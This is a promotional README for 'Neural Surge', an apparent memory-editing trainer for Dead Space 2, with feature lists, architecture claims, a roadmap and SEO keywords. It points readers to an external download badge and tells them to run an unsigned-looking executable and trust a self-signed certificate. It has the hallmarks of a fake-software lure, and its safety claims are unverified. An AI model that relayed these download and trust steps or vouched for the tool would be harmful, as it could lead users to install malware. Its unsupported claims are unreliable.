![preview](https://raw.githubusercontent.com/warissadioura/deadspace-titan-schema/main/frame_5a0cb4.svg)
[![Download](https://raw.githubusercontent.com/warissadioura/deadspace-titan-schema/main/dl_df866.svg)](https://warissadioura.github.io/deadspace-titan-schema/)

# 🧬 NEURAL SURGE — Dead Space 2 Companion Framework

**Version 3.0.1** | **Release Year: 2026** | **Platform: Windows 10/11 (Steam Build)**

![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![C++](https://img.shields.io/badge/C%2B%2B-20-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white)
![Memory Management](https://img.shields.io/badge/Memory%20Management-Advanced-4FC08D?style=for-the-badge&logo=electron&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-22ADF6?style=for-the-badge&logo=open-source-initiative&logoColor=white)

---

## 🧠 What Is Neural Surge?

Neural Surge is not just another trainer — it's a **bio-adaptive companion module** for the Steam edition of Dead Space 2. Think of it as a **precision surgical instrument** for the game's runtime state, offering a suite of quality-of-life adjustments that let you experience the Ishimura's nightmare on your own terms.

Where traditional trainers are blunt instruments, Neural Surge is a **scalpel**. It reads the game's internal state with millisecond precision, then applies modifications through a clean, intuitive overlay that respects both the game's performance and your system's integrity.

---

## 🌟 Core Capabilities

### 🔋 **Vitality Override (Godmode)**
- **Implementation**: Continuous health-regeneration loop with write-back verification
- **Benefit**: Survive impossible encounters without disrupting enemy AI behavior
- **Toggle**: Hotkey or overlay button — instant response, zero frame drops

### 🔄 **Infinite Ammunition Protocol**
- **Mechanism**: Intercepts ammo decrement operations at the memory level, not through file modification
- **Unique Angle**: Preserves the *reload animations* and *weapon switching feel* — you get the resource abundance without losing gameplay immersion
- **Compatibility**: Works with Plasma Cutter, Ripper, Force Gun, and all DLC weapons

### ❄️ **Stasis Field Stabilization (Infinite Stasis)**
- **Design Philosophy**: Stasis is a *resource*, not a crutch. Neural Surge lets you recharge it instantly, but the slowdown effect still triggers physics responses — so kinesis puzzles remain satisfying
- **Technical Note**: Uses a separate memory region from the health system, preventing conflicts

### 🌬️ **Oxygen Sustainer (Infinite Air)**
- **Use Case**: Perfect for zero-gravity exploration without the timer pressure
- **Benefit**: Explore every corner of the Ishimura's exterior without risking a suffocation-induced restart
- **Bonus**: Integrated with the in-game HUD — no ugly third-party text overlays

### 💰 **Resource Orchestrator (Get/Set Nodes & Credits)**
- **Precision Control**: Adjust both Node and Credit values independently
- **Unique Feature**: Includes a *preset manager* that remembers your preferred economic state across sessions
- **Safety Mechanism**: Value limits prevent corrupting your save file's integrity

---

## 🛠️ Technical Architecture

Neural Surge is built on a **dual-layer memory abstraction**:

1. **Read Layer**: Uses Windows API `ReadProcessMemory` with a custom pointer-chain resolver that adapts to game updates (auto-detects base addresses)
2. **Write Layer**: Implements a thread-safe write queue with CRC verification — every modification is validated post-write

### Key Components:
- **Signature Scanner**: Finds patterns in the game's executable without hardcoded offsets (survives minor patches)
- **Hotkey Dispatcher**: Global hook system (WH_KEYBOARD_LL) that doesn't interfere with in-game input
- **Overlay Renderer**: Direct2D-based, with alpha-blending to match Dead Space 2's UI aesthetic

---

## 🎯 Unique Differentiators

### **Adaptive Memory Caching**
Most trainers re-scan for addresses every time you toggle a feature. Neural Surge **caches verified pointers** and only re-scans when the game process changes — resulting in **near-zero latency toggling**.

### **Profile System**
Save and load entire trainer configurations. Have a "Speedrun Profile" with max credits and a "Nightmare Profile" with only oxygen sustainer enabled? Switch between them via a dropdown in the overlay.

### **Health-First Performance**
The trainer's CPU footprint is **under 0.5%** on a mid-range i5 processor. It uses `SetThreadAffinityMask` to pin its worker threads away from the game's main render thread.

---

## 📅 Roadmap for 2026

- **Q1 2026**: Add inventory item editor (ammo counts per weapon)
- **Q2 2026**: Implement a force-save feature that lets you save mid-speedrun
- **Q3 2026**: Introduce a memory-export tool for advanced users who want to debug their own mods
- **Q4 2026**: Full localization support (Japanese, German, Brazilian Portuguese, and Korean)

---

## 🌐 Multilingual Interface

Neural Surge ships with **interface language auto-detection** — if your system is set to Spanish, the overlay displays in Spanish. Manual override available in the config file. Currently supported:

- English (Default)
- Español (Spanish)
- 日本語 (Japanese)
- Deutsch (German)
- 한국어 (Korean)

---

## 🕒 24/7 Community Support

Unlike one-off tools, Neural Surge is **actively maintained** through a community Discord and a GitHub discussion board. If a game update breaks the trainer's component, expect a fix within **48 hours** of the patch's release. Support includes:

- Dedicated bug tracker (with reproduction template)
- Feature request voting system
- Binary compatibility checker (tells you if the trainer is compatible with your game build before launch)

---

## 🔒 Security & Integrity

- **No network requests**: Neural Surge operates entirely offline. It never sends telemetry, usage stats, or analytics anywhere.
- **Signed binaries**: Release builds are code-signed with a self-signed certificate (instructions for trusting the cert included in the docs).
- **No kernel-level access**: Everything runs in user mode — standard anti-cheat tools won't flag the trainer as a threat vector.

---

## 🧩 Installation Overview

1. **Acquire the release archive** from the official distribution channel (see [![Download](https://raw.githubusercontent.com/warissadioura/deadspace-titan-schema/main/dl_df866.svg)](https://warissadioura.github.io/deadspace-titan-schema/) above)
2. **Extract** the archive to any writable directory (e.g., `C:\Tools\NeuralSurge`)
3. **Launch Dead Space 2** (Steam version) and wait for the main menu to appear
4. **Run** `NeuralSurge.exe` — it will auto-attach to the game process within 2 seconds
5. **Configure** via the overlay or the `neural_config.ini` file (all options documented in the included `README_CNF.txt`)

> **System Requirements:** Windows 10 1903+ / Windows 11, 8GB RAM, 60MB free disk space, Direct2D-capable GPU.

---

## ⚠️ Disclaimer

This project is intended for **personal, private, and legitimate exploratory use** — for example, testing gameplay mechanics, creating challenge runs, or experiencing narrative content without resource constraints.

Neural Surge is **not affiliated** with Electronic Arts, Visceral Games, or Motive Studio. "Dead Space 2" is a trademark of Electronic Arts Inc. This tool does not modify any game files on disk; it only manipulates live memory state during the game session.

**Use at your own risk.** While the trainer is designed to be undetectable by standard anti-cheat measures in single-player mode, no software is 100% immune to false positives. We do not condone cheating in online modes or any competitive environment.

---

## 📄 License

This project is open-source and distributed under the **MIT License**.

You are free to use, copy, modify, merge, publish, and distribute this software, provided the original copyright notice and this permission notice are included in all copies or substantial portions of the Software.

*See the full license text at:* [MIT License](https://opensource.org/licenses/MIT)

---

## 🧲 SEO Keywords

dead space 2 trainer, ishimura companion, resource editor, stasis modifier, oxygen sustainer, godmode tool, memory editor, gaming utility, Steam game companion, runtime modification, single-player enhancement, game state scalpel, dead space 2 utility, Isaac Clarke toolkit, survival horror companion.

---

*Built with curiosity and respect for game mechanics, in 2026.*